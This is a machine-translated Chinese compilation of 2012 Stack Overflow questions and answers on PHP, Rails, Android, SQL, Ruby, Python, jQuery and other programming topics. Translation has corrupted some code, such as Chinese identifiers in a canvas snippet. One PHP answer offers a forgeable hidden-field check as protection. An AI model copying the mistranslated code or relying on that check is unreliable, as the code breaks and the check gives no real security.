var x = "<?php echo $id;?>"
$.ajax({ url: 'win.php' ,
         data: { id: x }
   }); 
}

function winB() 
{
var val = "<?php echo $i;?>"
$.ajax({ url: 'win.php' ,
         data: { id: val }
   }); 
} 
```

文件 win.php 更新 MySQL 的获胜者。让我烦恼的是，如果有人只是去

[http://mysite.com/win.php?id=1](http://mysite.com/win.php?id=1)

并刷新了很多次，我显然会在 MySQL 服务器上得到一些不正确的结果。

我想知道如何做到这一点，以便只有在适当的时候才能通过这个 ajax 调用访问 URL。或者，使 win.php 文件仅在加载 php 文件后具有过期的“授权”时才实际执行。

在此先感谢，亚伦。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:24:23.000

您可以使用会话，从我的评论扩展：

**游戏主页面**

```
<?php
session_start();

//Do game....

//Decide Winner

$_SESSION['winner']='A'; //or B depending on who won

?> 
```

**然后是一个带有空白参数等的 AJAX 请求，就这样 won.php 被触动了**

```
function win(){
  $.ajax({
    url: "win.php",
    cache: false
  }).done(function(html){
   //Dont do anything or you could get a response from the won.php request an update something
  });
 } 
```

**赢.php**

```
<?php
session_start();

if(isset($_SESSION['winner'])){
    $winner=$_SESSION['winner'];
    //Do update ect

    //Unset Winner session var, by unsetting the user would need to play the game again to get it set
    unset($_SESSION['winner']);
}else{
    header('Location: ./index.php');
}

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:13:11.690

使用 PHP，在页面上假设您`http://mysite.com/win.php?id=1`只使用隐藏输入，其值如下

```
<input type="hidden" name="verify"> 
```

`http://mysite.com/win.php?id=1`在开头的页面上放一些类似的东西

```
if (isset($_POST['verify'])) {
   // perform what you want
} else {
   header("Location: wherever/you/want");
} 
```

除非设置了隐藏，否则该页面将不会运行`$_POST['verify']`。

也许如果您在数据库中为您的比赛使用唯一名称，您还可以在运行该函数以插入新数据之前检查它是否存在于查询中。

要运行查询检查，我们假设每个比赛名称都有一个唯一的 ID 或名称。我们将比赛 A 称为“id 1”，并假设它是您表中的主键。运行查询以检查该 id，如下所示：

```
function checkContest() {
  $connection = // your connection info;
  $query = "SELECT *
            FROM table
            WHERE id = '1'";

  $result = $connection -> query($query);

  if ($result -> num_rows > 0) {
     // end function
  } else {
     // call the function that contains the INSERT query
  } 
```

然后在您的 ajax 中，您调用新函数 checkContest() （或它所在的处理程序文件）而不是 win.php 中的函数（因为新函数仅在成功时调用 win.php 函数）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T02:14:30.863

假设您希望 win.php 文件只为 winA() 运行一次，而只为 winB() 运行一次，您可以向您从每个函数传递的 AJAX 调用中传递的数据对象添加一个额外的属性，以标识哪个函数它来自（例如：func：“A”）。

然后在 win.php 中，您需要跟踪是否赢得了 winA 或 winB。这可能是一个会话变量，或者你可以在你的数据库中创建一个小表，它有 2 个字段 - “比赛”和“获胜”，以及 2 行（一个用于 winA，一个用于 winB）。第一次 win.php 被任一函数调用时，您更新“赢得”列，任何后续调用您首先检查该列，如果它不为空，那么您知道比赛已经获胜并跳过 win.php 处理的其余部分.

通常，当我想添加这样的某种限制时，我更喜欢在服务器端进行，因为它更容易控制，而其他人更难以操作。

# ruby-on-rails - 数据库恶作剧：如何让我的网站“记住”用户投票？

> ID：10220686
> 
> 赞同：0
> 
> 时间：2012-04-19T02:05:05.953
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.1

我的代码的基本大纲是这样的：

1.  检查用户是否有与特定“报告”关联的“投票”对象

2.  如果没有这样的投票对象，则创建一个。

3.  给它一个值（upvote vs. downvote）

4.  如果存在这样的投票对象，则更改现有投票的值。

但问题是……即使它（显然）存在于数据库中，程序也永远不会找到投票对象！

我的代码如下所示：

```
 def vote_up # voting code
      @was_new = false

      current_report = Report.find(params[:id])
      @report = current_report

      begin
        @vote = current_report.votes.find_by_user_id(current_user.id) #<<---HERE IS THE BUG!!
      rescue
        @was_new = true
        @vote = Vote.create(:user_id => current_user.id, :votable_type => 'Report', :value => 0)   # default vote score of zero
      end

      current_report.votes << @vote
      current_report.save

      if @was_new #if the vote was new...
        @report.upvotes += 1
        @vote.value = 1

      elsif !@was_new and @vote.value == -1 #else, if you are changing your vote...

        @report.upvotes += 1
        @report.downvotes -= 1
        @vote.value = 1

      end

        @vote.save
        @report.save

        redirect_to(report_path(@report))
    end 
```

我收到的错误是这样的：

```
 SQLite3::SQLException: no such column: votes.votable_id: SELECT  "votes".* FROM "votes"  WHERE "votes"."votable_id" = 3 AND "votes"."votable_type" = 'Report' AND "votes"."user_id" = 1 LIMIT 1 
```

我觉得解决方案很简单，比如写 @vote = current_report.votes.find(params[:user_id], :as => :user_id) 或类似的东西。

编辑：

我让它工作了。这是工作代码：

```
 def vote_up # voting code

 @exists = false

 get_vote(1)

 if !@exists #if the vote was new...
  @report.upvotes += 1

elsif @exists and @vote.value == -1 #else, if you are changing your vote...

  @report.upvotes += 1
  @report.downvotes -= 1
  @vote.value = 1

    end

    @vote.save
    @report.save

 redirect_to(report_path(@report))

end

def vote_down

 @exists = false

    get_vote(-1)

    if !@exists # this should handle vote changing
  @report.downvotes += 1

  elsif @exists and @vote.value == 1

  @report.downvotes += 1
  @report.upvotes -= 1
  @vote.value = -1

    end

    @vote.save
    @report.save

redirect_to(report_path(@report))

end

 def get_vote(val) # voting code
 current_report = Report.find(params[:id])

 @report = current_report
 @vote = current_report.votes.find_by_user_id(current_user.id) 

 unless @vote # create a vote only if it's nil
   @vote = Vote.create(:user_id => current_user.id, :votable_id => 3, :votable_type => 'Report',  :value => val) # default vote score of zero
   current_report.votes << @vote
  current_report.save
 else #if it's not nil
  @exists = true
end

end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T04:23:21.877

检查基于[动态属性的查找器](http://api.rubyonrails.org/classes/ActiveRecord/Base.html#label-Dynamic+attribute-based+finders)。您应该能够执行以下操作：（未经测试的代码）

```
def vote_up # voting code
  current_report = Report.find(params[:id])
  @report = current_report

  # gets the vote or initialize a new one for that user_id
  @vote = current_report.votes.find_or_initialize_by_user_id(current_user.id) 

  if !@vote.saved?
    @vote.votable_type = 'Report' 
    @vote.value = 0
    #  current_report.votes << @vote #not sure if it's necessary
    #  current_report.save #not sure if it's necessary

    @report.upvotes += 1
    @vote.value = 1
  elsif @vote.value == -1 
    @report.upvotes += 1
    @report.downvotes -= 1
    @vote.value = 1
  end

  @vote.save
  @report.save  

  redirect_to(report_path(@report))
end 
```

重要提示：还有一件事。您应该将此方法的大部分移植到您的 Report 模型中，这显然是一个商业问题，所以它应该去哪里！

# cursor - BIOS 数据区：Cursor Start (61h) 和 Cursor End (60h) 值的含义

> ID：10220692
> 
> 赞同：1
> 
> 时间：2012-04-19T02:05:59.180
> 
> 标签：cursor, hardware, bios, vga

我一直在寻找BIOS数据区中内存地址461h（Cursor Start）和460h（Cursor End）的明确含义。

但我刚刚发现一些参考资料说它是光标的“大小”。也有人说是指扫描线，使用的值也相差很大（63h 和 00h 用于 MCGA；67h 和 00 用于 80x25 文本模式；或者 01h 和 00h）但仍然不够具体，似乎如果 VGA 寄存器被手动编程为标准图形或文本模式（更具体地说是文本模式，实际使用光标）而不是使用 INT 10h，则有必要调整这些值，以便 DOS 或 BIOS 本身可以保持一致配置。

我看过谷歌搜索结果的前 2 页（Ralf Brown、mcamafia.de、Wikipedia、TinyVGA、BIOS Central 等），但它们包含的信息无法让我准确描述这些值的作用或配置它们对应于 VGA 寄存器，所以我会盲目地对这些值进行编程。

**那么对他们来说正确的定义是什么？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T15:46:18.550

我的理解：

460h-461h 是“光标形状”，大小=字。低字节保存结束扫描行号，而地址 40:61h 的高字节保存起始扫描行。对于视频模式 3，字符单元在 VGA 上通常为 16 条扫描线高。要关闭光标，请将结束扫描行号设置在起始扫描行号之上。

示例光标形状：

```
two line cursor at bottom:    0607h
lower half cursor:            0307h
upper half or quarter cursor: 0003h
full box cursor               0007h
blank cursor                  0100h 
```

# java - 将数据传递给 onActivityResult 的问题

> ID：10220702
> 
> 赞同：1
> 
> 时间：2012-04-19T02:06:39.373
> 
> 标签：java, android, object, android-activity

我试图将我的一项活动中的字符串发送到该组的主要活动，但我遇到了一个小问题。我试图在我的代码的 onActivityResult 部分中创建一个对象（这似乎有效）。但是当试图从这个类中访问除 getName() 之外的方法时，它会吐出一个资源未找到异常。我确信解决方案很简单，但在仔细研究后它仍然让我难以理解。这是代码....

**主要活动**

```
public void onActivityResult(int requestCode, int resultCode, Intent data)
   {
       super.onActivityResult(requestCode, resultCode, data);
       switch(requestCode)
       {
       case 0:
           //for add activity
           if(resultCode == RESULT_OK)
           {

                        namePasser = data.getExtras().getString("tallyName").toString();
                        itemHm.put("item1", new Items(namePasser,1));
                        itemAmt++;
                        currItem = itemHm.get("item1");
                        nameView1.setText(currItem.getName());
                        countView1.setText(currItem.getGroup());
                        count1b.setVisibility(View.VISIBLE);
                        reduce1b.setVisibility(View.VISIBLE);
                        countView1.setVisibility(View.VISIBLE);
                        resetb.setVisibility(View.VISIBLE);

           }
       }
   } 
```

**添加活动**

```
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.text.Editable;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class addActivity extends Activity
{
    EditText name;
    String itemName;
    Button next;
    Intent data;
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.addactivityxml);
        Button next = (Button) findViewById(R.id.button1);
        next.setOnClickListener(new View.OnClickListener() 
        {
            public void onClick(View view) 
            {
                name = (EditText)findViewById(R.id.newitemtxt);
                itemName = name.getText().toString();
                data = new Intent();
                data.putExtra("tallyName", itemName);
                setResult(RESULT_OK, data);
                finish();
            }
        });
    }
} 
```

**物品类**

```
public class Items
{
    int id = 0;
    int group = 0;
    String name = "";
    int count = 0;
    public Items(String name, int count)
    {
        this.count = count;
        this.name = name;
    }
    public Items(String name, int count, int group)
    {
        this.group = group;
        this.name = name;
        this.count = count;
    }
    public Items(int id, String name, int group)
    {
        this.id = id;
        this.group = group;
        this.name = name;
    }
    public String getName()
    {
        return name;
    }
    public int getCount()
    {
        return count;
    }
    public int addCount()
    {
        count++;
        return count;
    }
    public int reduceCount()
    {
        if(count > 0)
        {
            count--;
            return count;
        }
        return count;
    }
    public int resetCount()
    {
        count = 0;
        return count;
    }
    public void setGroup(int group)
    {
        this.group = group;
    }
    public int getGroup()
    {
        return group;
    }
} 
```

当我运行 nameView1.setText(currItem.getName()); 时，数据本身正在传递给 onActivity Result；没有问题，

但是当试图运行 countView1.setText(currItem.getGroup()); 那就是问题发生的时候

哦！这是错误日志

> 04-19 11:09:56.219: W/dalvikvm(1970): threadid=1: 线程退出未捕获异常 (group=0x409c01f8) 04-19 11:09:56.258: E/AndroidRuntime(1970): 致命异常: main 04-19 11:09:56.258: E/AndroidRuntime(1970): java.lang.RuntimeException: 传递结果失败 ResultInfo{who=null, request=0, result=-1, data=Intent { (has extras) }}到活动 {com.DanielFurnell.iTallyLite/com.DanielFurnell.iTallyLite.ITallyLiteActivity}：android.content.res.Resources$NotFoundException：字符串资源 ID #0x0 04-19 11:09:56.258：E/AndroidRuntime(1970)：在android.app.ActivityThread.deliverResults(ActivityThread.java:2980) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.app.ActivityThread.handleSendResult(ActivityThread.java:3023) 04-19 11: 09:56.258：E/AndroidRuntime(1970)：在 android.app.ActivityThread。访问$1100(ActivityThread.java:123) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.app.ActivityThread$H.handleMessage(ActivityThread.java:1177) 04-19 11:09:56.258 : E/AndroidRuntime(1970): 在 android.os.Handler.dispatchMessage(Handler.java:99) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.os.Looper.loop(Looper. java:137) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.app.ActivityThread.main(ActivityThread.java:4424) 04-19 11:09:56.258: E/AndroidRuntime(1970) : 在 java.lang.reflect.Method.invokeNative(Native Method) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 java.lang.reflect.Method.invoke(Method.java:511) 04- 19 11:09:56.258: E/AndroidRuntime(1970): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784) 04-19 11:09:56.258: E/AndroidRuntime(1970) ：在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 dalvik.system.NativeStart.main(Native Method) 04-19 11:09:56.258：E/AndroidRuntime(1970)：原因：android.content.res.Resources$NotFoundException：字符串资源 ID #0x0 04-19 11:09:56.258：E/AndroidRuntime(1970)：在 android。 content.res.Resources.getText(Resources.java:247) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.widget.TextView.setText(TextView.java:3473) 04-19 11: 09:56.258: E/AndroidRuntime(1970): 在 com.DanielFurnell.iTallyLite.ITallyLiteActivity.onActivityResult(ITallyLiteActivity.java:73) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.app.Activity .dispatchActivityResult(Activity.java:4649) 04-19 11:09:56.258: E/AndroidRuntime(1970): 在 android.app.ActivityThread。deliverResults(ActivityThread.java:2976) 04-19 11:09:56.258: E/AndroidRuntime(1970): ... 11 更多

我也很确定该项目的文本框没有任何问题，因为我可以在 ActivityResult 之外为其分配其他值提前感谢任何可以帮助我解决此问题的人 =)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:14:17.757

```
countView1.setText(currItem.getGroup()); 
```

可能是这一行有问题，`getGroup`返回`int`类型，它认为是字符串id，**所以你需要检查返回值是不是一个有效的字符串id**，如果你只想用`getGroup`return设置内容，试试用：

```
countView1.setText(currItem.getGroup()+""); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:10:56.353

```
name = (EditText)findViewById(R.id.newitemtxt); 
```

从点击事件中删除这一行并添加下面的按钮 next = ...

并尝试..

# sql - Sum in Decode statement?

> ID：10220705
> 
> 赞同：0
> 
> 时间：2012-04-19T02:07:11.047
> 
> 标签：sql

I have to provide counts for different activities, some of the columns are from some table but few I have to take by joining other tables. **And in the last column I have to add counts** **of 5 columns togather in one field**.Please see my query below and advice the best way to achieve my results :)

```
SELECT web. OID,web. MARKETING_GROUP,
  SUM(DECODE(WEB.EVENT_TYPE,5,WEB.ACTIVITY_COUNT,0))  AS DISCUSSIONCOMMENT ,
  SUM(DECODE(WEB.EVENT_TYPE,6,WEB.ACTIVITY_COUNT,0))  AS DISCUSSIONSTART ,
  SUM(DECODE(WEB.EVENT_TYPE,7,WEB.ACTIVITY_COUNT,0))  AS DISCUSSIONVIEW,  
  SUM(case when o.when _clicked is not null then c(*))AS clickcount, 
  **SUM(case when WEB.EVENT_TYPE in(5,6,7,8)then WEB.ACTIVITY_COUNT +c.count(*))as Total** --------- This is where I am getting stuck and confused???
  from GMMI_AIR.WEB_ACTIVITY_FCT WEB join GMMI_AIR.COUPON_WEB_ACTIVITY C
     on WEB.OID_WEB_ACTIVITY_FCT = C.OID_COUPON_WEB_ACTIVITY 
```

I am really stuck as the table which is joined doesn'thave field named activity_count or activity_type so to see the counts I can only do count(*) but to add it all other fileds in one column and sum it up is very confusing??

Any help??/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:18:24.900

```
SELECT web. OID,web. MARKETING_GROUP,
  SUM(DECODE(WEB.EVENT_TYPE,5,WEB.ACTIVITY_COUNT,0))  AS DISCUSSIONCOMMENT ,
  SUM(DECODE(WEB.EVENT_TYPE,6,WEB.ACTIVITY_COUNT,0))  AS DISCUSSIONSTART ,
  SUM(DECODE(WEB.EVENT_TYPE,7,WEB.ACTIVITY_COUNT,0))  AS DISCUSSIONVIEW,  
  SUM(case when o.when _clicked is not null then c(*))AS clickcount, 
  SUM(case when WEB.EVENT_TYPE in(5,6,7,8)then WEB.ACTIVITY_COUNT END) +c.count(*) as Total
from GMMI_AIR.WEB_ACTIVITY_FCT WEB join GMMI_AIR.COUPON_WEB_ACTIVITY C
     on WEB.OID_WEB_ACTIVITY_FCT = C.OID_COUPON_WEB_ACTIVITY
GROUP BY web. OID,web. MARKETING_GROUP; 
```

# mysql - MYSQL终端Mac命令不起作用'mysql'

> ID：10220708
> 
> 赞同：5
> 
> 时间：2012-04-19T02:07:37.247
> 
> 标签：mysql, command-line, terminal, mamp

我的主目录中有一个隐藏文件，`.profile`其名称如下：

```
MYSQL_HOME = /usr/local/mysql/bin/mysql
export PATH=$MYSQL_HOME/bin:$PATH 
```

以下命令有效：

```
$ /usr/local/mysql/bin/mysql 
```

然而`mysql`没有。如何更改路径以使命令正常工作？我已经安装了 MAMP，我只是不知道如何使用它。谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-19T02:11:22.687

我相信错误在你的第一行：

```
 MYSQL_HOME=/usr/local/mysql/bin/mysql 
```

应该是这样的：

```
 MYSQL_HOME=/usr/local/mysql 
```

# ios - 故事板-JPEG

> ID：10220712
> 
> 赞同：4
> 
> 时间：2012-04-19T02:07:59.543
> 
> 标签：ios, xcode

我喜欢 XCode 故事板，我想将其导出为 jpeg 或 PDF 或我可以通过电子邮件发送给没有 XCode 程序的其他人的东西。怎么做？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:21:32.267

Xcode 中的故事板是 XML 文件而不是实际图像，不能导出为图像。相反，您可以按`⌘ ⇧ 4`进入屏幕截图模式并以这种方式拍照。它将自动保存到您的桌面。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:17:38.490

XCode 没有内置用于故事板的导出功能，但要实现您想要的效果，您只需双击您想要的故事板，进入全屏并截取屏幕截图。

# iphone - 选择器视图 cocos2d

> ID：10220716
> 
> 赞同：0
> 
> 时间：2012-04-19T02:09:05.173
> 
> 标签：iphone, objective-c, cocos2d-iphone, uipickerview

我正在使用 cocos2d 并且需要为我的游戏中的一个场景提供一个pickerview。但是 ccnode 不支持 ui kit pickerview。有谁知道我可以将pickerview合并到我的游戏中的合理方式，或者可能知道与pickerview具有类似行为的替代方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-23T00:45:53.677

[我已经在https://github.com/fidgetware/CCPickerView](https://github.com/fidgetware/CCPickerView)提交了我的 Cocos2d CCPickerView 版本。它是 UIPickerView 的替代品，具有一些额外的功能，例如旋转功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T07:11:09.137

您可以轻松地在场景中使用选取器视图。而不是在 self.view 上添加视图，而是将其添加到`[[[CCDirector sharedDirector] openGLView] addSubview:pickerView];` Rest 所有委托方法保持不变...希望这会有所帮助.. :)

# html - 如何理解硬件加速画布

> ID：10220717
> 
> 赞同：0
> 
> 时间：2012-04-19T02:09:06.780
> 
> 标签：html, canvas

我读过[一篇文章](http://blogs.msdn.com/b/eternalcoding/archive/2012/03/22/unleash-the-power-of-html-5-canvas-for-gaming-part-1.aspx)，有一种叫做硬件加速画布的东西
代码片段是

```
// 设置硬件缩放
画布.宽度 = 300;
canvas.style.width = window.innerWidth + 'px';
画布.高度 = 200;
canvas.style.height = window.innerHeight + 'px';

```

我在这里不太明白，这有什么意义？
它不会降低画布中内容的质量，比如在其中显示更大的像素吗？
谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:20:03.513

是的，它的分辨率会更低，但帖子还说：

> ...我们可以在较小的分辨率上工作，让 GPU 重新调整结果以适应 DOM 对象（**使用漂亮且免费的过滤器来模糊结果**）。

从理论上讲，这种技术应该可以在不牺牲太多质量的情况下提高性能。您可能想玩`canvas.width`并`canvas.height`获得最佳性能/质量比。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:21:23.937

显然，是的，它会的。

这就像以较低的分辨率（如 640x480）全屏运行游戏。

还有[一篇文章](http://blogs.msdn.com/b/davrous/archive/2012/04/06/modernizing-your-html5-canvas-games-with-offline-apis-file-apis-css3-amp-hardware-scaling.aspx)涵盖了这一点。

> 顺便说一下，这并不是 HTML5 特有的。大多数现代主机游戏不是在内部以 720p 或 1080p 计算的。几乎所有这些都以较低的分辨率（例如 1024x600）渲染游戏，并让 GPU 进行缩放/抗锯齿处理。在大多数情况下，这可以帮助您提高 FPS。

# html - 如何根据条件将参数转发到 JSP

> ID：10220721
> 
> 赞同：-1
> 
> 时间：2012-04-19T02:09:44.160
> 
> 标签：html, jsp, post, http-post

我有一个带有多个提交按钮的 jsp 页面。现在，如果我想根据用户单击的提交按钮（即基于某些条件）将参数转发到 jsp 文件。如何做到这一点？

我正在考虑使用 jsp:forward 来传递 jsp:params （在调用者页面中定义）。但是，我无法弄清楚如何使参数名称有条件。

有人可以建议如何实施吗？

任何帮助将不胜感激。

谢谢，

索姆纳特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T07:12:49.380

如果您不使用 servlet，这样的事情怎么样？这是与`JSTL`.

```
<c:choose>
<c:when test="${param.button1}">
<jsp: forward page="page1.jsp">
  <jsp: param name="myParam" value="whatever1"/>
</jsp: forward>
</c:when>
<c:when test="${param.button2}">
<jsp: forward page="page2.jsp">
  <jsp: param name="myParam" value="whatever2"/>
</jsp: forward>
</c:when>
</c:choose>

<form method="POST" action="">
<input type="submit" name="button1" value="button1" />
<input type="submit" name="button2" value="button2" />
</form> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:18:30.597

您可以为每个提交按钮赋予不同的值。见
[http://www.chami.com/tips/internet/042599I.html](http://www.chami.com/tips/internet/042599I.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T15:03:06.743

让每个提交按钮成为表单中的一个按钮，然后在单击它时调用一个确定它来自何处的 javascript 函数，或者让该函数是唯一的，然后将该值作为参数转发给 servlet。

# python - 当我的字符串长度正确时，为什么 struct.unpack() 会抛出异常？

> ID：10220724
> 
> 赞同：0
> 
> 时间：2012-04-19T02:10:02.960
> 
> 标签：python, struct

我有一个文件，其中有些行是我可以忽略的元数据，有些行是 struct.pack 调用的打印结果。说 f.txt 是：

```
key: 3175
\x00\x00\x00\x00\x00\x00\x00\x00
key: 3266
\x00\x00\x00\x00\x00\x00\x00\x00 
```

在这种情况下，以“key”开头的行是元数据，字节字符串是我要提取的值。同样在这种情况下，两个字节字符串行是使用 struct.pack('d', 0) 生成的。以下代码是我想做的：

```
import struct
for line in open('f.txt', 'r'):      
  # if not metadata, remove newline character and unpack
  if line[0:3] != 'key':
    val = struct.unpack('d', line[0:-1])
    appendToList(val) # do something else with val 
```

有了这个，我得到：“struct.error：unpack 需要一个长度为 8 的字符串参数”。

如果我们稍微修改一下代码：

```
import struct
for line in open('f.txt', 'r'):      
  # if not metadata, remove newline character and unpack
  if line[0:3] != 'key': print line[:-1] 
```

然后输出如预期：

```
\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00 
```

如果我将字节字符串直接放入 unpack 调用中，我就成功了：

```
import struct
# successful unpacking
struct.unpack('d', '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') 
```

我尝试将以下行的变体传递给解包，所有这些都给出相同的结果：

```
str(line)
repr(line)
b"%s" % line 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T03:11:22.860

文本文件中的实际字节是您在 python 控制台上看到的字符串转义字节，而不是它们所代表的二进制字节。

例如，您的文本文件包含`\x00`（四个字节长），而不是空字节（一个字节长）。

您需要先取消转义此文本（将其转换为二进制形式），然后 struct 才能对其进行处理。

**（请注意，您的文件格式不是很好，因为您可以想象有一行是数字但以 'key:' 开头！例如`'key: \x00\x00\x00'`是一个有效的数字`6.8388560679e-313`！如果您在元数据和每隔一行的值之间交替，您应该保持跟踪您所在的行号并进行相应的解析。）**

这里有一个比其他解决方案简单得多的解决方案。

Python 有一个名为的内置编解码器[`string_escape`](http://docs.python.org/library/codecs.html#standard-encodings)，它将 python-escape 代码转换为它们所代表的二进制字节：

```
for line in thefile:
    if line[0:3] != 'key':
        binaryline = line[:-1].decode('string_escape')
        val = struct.unpack('d', binaryline) 
```

如果您有这些双精度值的大列表并希望将它们有效地存储在数组结构中，请考虑使用[`array`](http://docs.python.org/library/array.html)模块而不是`struct`：

```
vals = array.array('d')

for line in thefile:
    if line[0:3] != 'key':
        binaryline = line[:-1].decode('string_escape')
        # appends binaryline to vals array, interpreting as a double
        vals.fromstring(binaryline) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:51:07.880

对于 txt 文件中的字符串：

```
\x00\x00\x00\x00\x00\x00\x00\x00 
```

在python中它实际上是：

```
\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 
```

所以你应该解析这个字符串并转换它。对于您的示例，使用以下代码可以获得您想要的内容：

```
s = line.strip().split('\\x')
r = ''
for v in s:
    if len(v) > 0:
        print v
        r += struct.pack('b', int(v, 16))
val = struct.unpack('d', r)[0]
print val 
```

# maven - 最简单的 maven 模块，只归档源目录

> ID：10220725
> 
> 赞同：0
> 
> 时间：2012-04-19T02:10:21.133
> 
> 标签：maven

我有多个子模块相当复杂的 Maven 项目。最近我需要另一个包含一些维护/部署脚本的子模块。将它作为另一个 maven 子模块的原因是因为我的构建脚本需要版本标记并打包完整的发行版。

出于某种原因，我找不到仅压缩源目录并将其放入“目标”文件夹的现有 Maven 原型。有人可以指出我应该使用的正确原型吗？或者这可以通过编写一个简单的 pom 文件来完成。也许 maven-archvie-plugin 可以做到这一点，但我不知道如何设置它，以便它在构建的“打包”阶段存档并将输出放置到正确的位置。尽管编写了一个大型构建脚本，但我的 maven mojo 仍然非常有限。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T06:18:20.900

我可以看到两种方法：

*   保留脚本`src/main/resources`并使用生成的 jar 文件（如果您的项目具有*jar*类型的*打包*）。jar 文件本质上是一个 zip 文件，将在*目标*目录中生成。一旦你创建了一个版本，它也将被版本化、部署等。这可能是最简单的解决方案。
***   如果您想要一个*zip*文件（或*tar.gz*或类似文件），请使用 Maven Assembly Plugin 创建一个程序集，这将使您能够更精细地控制生成的存档及其内容。请参阅插件页面上的示例：[http ://maven.apache.org/plugins/maven-assembly-plugin/](http://maven.apache.org/plugins/maven-assembly-plugin/)**

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T06:31:50.690

您可以使用专门用于该目的的[maven-sources-plugin 。](http://maven.apache.org/plugins/maven-source-plugin/)但通常如果您执行 mvn release，也会生成源工件。当然，您也可以为此目的使用 maven-assembly-plugin。根据您的描述，我建议有一个单独的 maven 模块，它由 src/main/resources 中的脚本组成，并且应该激活过滤以将版本信息放入脚本中。在该模块中，您可以使用 maven-sources-plugin。**

# ruby - 堆栈级别太深，但不确定究竟是什么导致了无限递归

> ID：10220726
> 
> 赞同：0
> 
> 时间：2012-04-19T02:10:29.867
> 
> 标签：ruby

所以我对此的研究似乎表明这里有一些东西导致了无限递归，但我不确定它是什么。谁能指出我做错了什么？

```
def initialize(_val)
    @start_value = _val
end

def method_missing(method, *args)
    if method.starts_with?("plus") then
        num = method[4 .. method.length]
        if (/^[\d]+(\.[\d]+){0,1}$/ === num) then
            number = Integer(num)
            self.class_eval("def #{method}; return @start_value + x; end")
        self.plus(number)
        else
            super.method_missing
        end
    else
        super.method_missing
    end
end

end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:13:58.130

最明显的解释是如果您没有`plus`定义为实例方法。但是为什么不在`puts method`你的方法的顶部添加一个，`method_missing`这样你就可以看到发生了什么？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:17:04.260

你不应该这样做：

```
super.method_missing 
```

你要这个：

```
super 
```

在这两种情况下，您都将使用`super`不带 args 的方法，在这种情况下，这是调用祖先版本的方法的正确方法`method_missing`。但是在您的版本中，您随后`method_missing`对结果进行了冗余调用，这就是它无限的地方。

# javascript - How to write code below as jquery?

> ID：10220732
> 
> 赞同：1
> 
> 时间：2012-04-19T02:11:24.170
> 
> 标签：javascript, jquery

How can I write the code below as a jquery:

```
var imagefile = document.getElementsByClassName("fileImage");
var filename = imagefile.files[0]; 
```

I attempted this below but it says it is not defined even though I have already stated file input's class is 'fileImage'.

```
var filename = $('.fileImage').files[0]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:16:32.750

你不能直接这样`imagefile.files[0]`做

```
document.getElementsByClassName("fileImage")
//and
$('.fileImage') 
```

返回一个“类似数组”的项目列表。（AFAIK，`getElementsBy*`函数，除了`getElementsById`，返回 a `NodeList`）

在获得`files[0]`.

对于纯 JS 方法：

```
for(var i=0; i < imagefile.length;i++){
    var imgfile = imagefile[i];

    //now imgfile is the DOM element itself
    imgfile.files[0];
} 
```

对于 jQuery，你链接`.each()`

```
$('.fileImage').each(function(){

   //"this" in here is the DOM element

   this.files[0];

}) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:20:47.253

$() 函数返回的 jQuery 对象没有 .files 属性——该属性属于 DOM 元素。尝试这个：

```
var filename = $('.fileImage')[0].files[0]; 
```

如果没有元素匹配选择器，这仍然会出错，否则它使用 jQuery 对象上的方括号数组语法来获取对第一个匹配元素的引用。

如果要测试是否有任何元素与选择器匹配，请使用 jQuery objects .length 属性：

```
var $files = $('.fileImage'),
    filename;
if ($files.length > 0) {
   filename = $files[0].files[0];
   // do something with filename...
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:15:56.650

因为`.files[]`不是 jQuery 的一部分。

